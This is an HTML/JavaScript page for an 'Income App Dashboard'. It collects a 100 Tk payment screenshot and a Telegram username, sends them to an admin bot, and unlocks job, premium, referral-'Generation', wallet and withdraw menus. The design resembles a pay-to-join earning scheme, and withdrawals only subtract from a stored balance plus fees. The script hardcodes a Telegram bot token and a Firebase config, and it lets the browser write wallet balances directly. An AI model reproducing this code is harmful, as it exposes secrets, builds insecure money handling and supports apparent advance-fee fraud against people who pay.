<!DOCTYPE html>
<html>
<head>
<title>Income App Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial; background:#0f172a; color:white; text-align:center;}
button {padding:15px; margin:10px; width:80%; border:none; border-radius:10px; font-size:18px; background:#22c55e; color:white;}
input {margin:10px; padding:10px; width:80%;}
.menu-section {margin-top:30px; border-top:1px solid #555; padding-top:20px;}
.disabled {opacity:0.5; pointer-events:none;}
.box{background:#1e293b;padding:20px;border-radius:12px;max-width:400px;margin:auto;}
</style>
</head>
<body>

<h2>ğŸ’° Income App Dashboard</h2>

<!-- ACCOUNT VERIFY -->
<div id="account-verify" class="box">
<h2>Account Verify â€” 100 Tk</h2>
<p>Send money â†’ Upload Screenshot</p>

<input id="name" placeholder="Your Name">
<input type="file" id="file">

<button onclick="sendScreenshot()">Submit Screenshot</button>
<p id="status"></p>
</div>

<!-- MENU -->
<div id="menu">
<div class="menu-section">
<button class="disabled" id="jobsBtn">ğŸ“‹ My Jobs & Proved</button>
<button class="disabled" id="premiumBtn">ğŸ’ Premium Package</button>
<button class="disabled" id="generationBtn">ğŸŒ³ Generation</button>
<button class="disabled" id="walletBtn">ğŸ’° My Wallet</button>
<button class="disabled" id="withdrawBtn">ğŸ§ Withdraw</button>
<button class="disabled" id="transferBtn">ğŸ” Transfer Balance</button>
<button id="supportBtn">ğŸ“ Support</button>
</div>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<script>
// ğŸ”¹ Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyAIgnpl1kL7JsnBsxUD_8QM-OrnHA4JaAA",
  authDomain: "miniapp-f641f.firebaseapp.com",
  projectId: "miniapp-f641f",
  storageBucket: "miniapp-f641f.firebasestorage.app",
  messagingSenderId: "650123816960",
  appId: "1:650123816960:web:dec31803b3cb73a0ba68e5"
};

firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const db = firebase.firestore();

// ğŸ”¹ Telegram Admin Details
const BOT_TOKEN = "8051092032:AAGSVOe8efxnJqnBhsM2wdOclA-qtf45V98";
const ADMIN_ID = "7832485327";
const BOT_USERNAME = "Easyearnverify_bot";

// ğŸ”¹ Telegram Username
let telegramUsername = prompt("Enter your Telegram username (e.g., @username)");

// ğŸ”¹ Submit Screenshot & Name
function sendScreenshot() {
  const name = document.getElementById("name").value;
  const file = document.getElementById("file").files[0];
  if(!file || !name){ alert("Fill name & select screenshot"); return; }

  // Upload to Firebase Storage
  const uploadTask = storage.ref('payments/' + telegramUsername + '_' + file.name).put(file);
  uploadTask.on('state_changed', snapshot=>{}, error=>{
    console.error(error); alert("Upload failed");
  }, ()=>{
    uploadTask.snapshot.ref.getDownloadURL().then(url=>{
      // Save in Firestore
      db.collection('users').doc(telegramUsername).set({
        name: name,
        screenshotURL: url,
        accountStatus: "pending",
        wallet: 0,  // à¦¶à§à¦°à§à¦¤à§‡ wallet 0
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      }).then(()=>{
        document.getElementById('status').innerText = 'âœ… Submitted â€” Waiting for approval';
        
        // Send to Telegram Admin
        const formData = new FormData();
        formData.append("chat_id", ADMIN_ID);
        formData.append("photo", file);
        formData.append("caption", `ğŸ’° New Verify Request\nğŸ‘¤ Name: ${name}\nğŸ†” Username: ${telegramUsername}\n\nApprove or Reject:`);
        formData.append("reply_markup", JSON.stringify({
          inline_keyboard: [
            [{text:"âœ… Approve", url:`https://t.me/${BOT_USERNAME}?start=approve_${telegramUsername}`}],
            [{text:"âŒ Reject", url:`https://t.me/${BOT_USERNAME}?start=reject_${telegramUsername}`}]
          ]
        }));
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:formData});
      });
    });
  });
}

// ğŸ”¹ Check Account Status & Wallet
db.collection('users').doc(telegramUsername).get().then(doc=>{
  if(doc.exists && doc.data().accountStatus === "approved"){
    enableMenu();
  }
});

// ğŸ”¹ Enable Menu
function enableMenu(){
  document.getElementById("account-verify").style.display = "none";
  document.querySelectorAll("#menu button").forEach(btn=>btn.classList.remove("disabled"));
}

// ğŸ”¹ Withdraw Example (10 Tk charge + Donation)
document.getElementById('withdrawBtn').addEventListener('click', ()=>{
  const amount = parseFloat(prompt("Enter amount to withdraw (Tk)"));
  if(isNaN(amount) || amount<=0) return alert("Invalid amount");

  db.collection('users').doc(telegramUsername).get().then(doc=>{
    if(doc.exists){
      let wallet = doc.data().wallet || 0;
      const charge = 10; // Example charge
      const donation = 5; // Example donation
      const totalDeduct = amount + charge + donation;

      if(wallet < totalDeduct) return alert("Not enough balance");

      wallet -= totalDeduct;

      db.collection('users').doc(telegramUsername).update({wallet: wallet}).then(()=>{
        alert(`Withdraw successful!\nAmount: ${amount} Tk\nCharge: ${charge} Tk\nDonation: ${donation} Tk\nRemaining Wallet: ${wallet} Tk`);
      });
    }
  });
});
</script>

</body>
</html>
